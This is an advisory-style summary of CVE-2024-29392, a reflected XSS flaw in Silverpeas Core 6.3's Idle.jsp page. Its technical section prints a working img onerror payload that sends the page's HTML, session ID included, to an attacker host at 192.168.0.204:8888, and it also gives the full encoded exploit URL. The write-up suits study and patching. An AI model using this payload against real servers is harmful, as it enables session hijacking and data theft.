The provided content relates to CVE-2024-29392.

**Root cause of vulnerability:**
The vulnerability is due to a lack of proper input sanitization in the `ClipboardSessionController` component of Silverpeas Core 6.3, allowing for reflected Cross-Site Scripting (XSS).

**Weaknesses/vulnerabilities present:**
- Reflected XSS vulnerability in the `ClipboardSessionController`.
- Inadequate input sanitization within the component.
- Bypassing of Content Security Policy (CSP) due to the XSS vulnerability.

**Impact of exploitation:**
- An attacker can obtain the session ID of a user by sending a crafted URL.
- Successful exploitation allows for bypassing the CSP.
- This could lead to unauthorized access, data theft, and other malicious activities.

**Attack vectors:**
- A non-authenticated attacker can send a crafted GET request to an admin.
- The vulnerable `Idle.jsp` page is accessible via the following path: `/silverpeas/Rclipboard/jsp/Idle.jsp`

**Required attacker capabilities/position:**
- The attacker needs to be able to craft a malicious URL with a payload.
- They need to convince an authenticated user, potentially an administrator, to click the crafted URL.

**Technical details:**
The provided payload is as follows:
```html
<img src=x onerror="this.src='http://192.168.0.204:8888/?'+document.documentElement.outerHTML; this.removeAttribute('onerror');"
```
This payload leverages the `onerror` event handler of an `img` tag. When the image fails to load (due to `src=x`), the onerror handler is triggered. The handler sets the image source to a URL containing the document's HTML and removes the onerror attribute to prevent further execution of the same.
The crafted URL for exploitation is provided:
`http://{LINK}/silverpeas/Rclipboard/jsp/Idle.jsp?%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%22%74%68%69%73%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%32%30%34%3a%38%38%38%38%2f%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%64%6f%63%75%6d%65%6e%74%45%6c%65%6d%65%6e%74%2e%6f%75%74%65%72%48%54%4d%4c%3b%20%74%68%69%73%2e%72%65%6d%6f%76%65%41%74%74%72%69%62%75%74%65%28%27%6f%6e%65%72%72%6f%72%27%29%3b%22%3e=aE`
This URL, when decoded, includes the malicious payload described above.
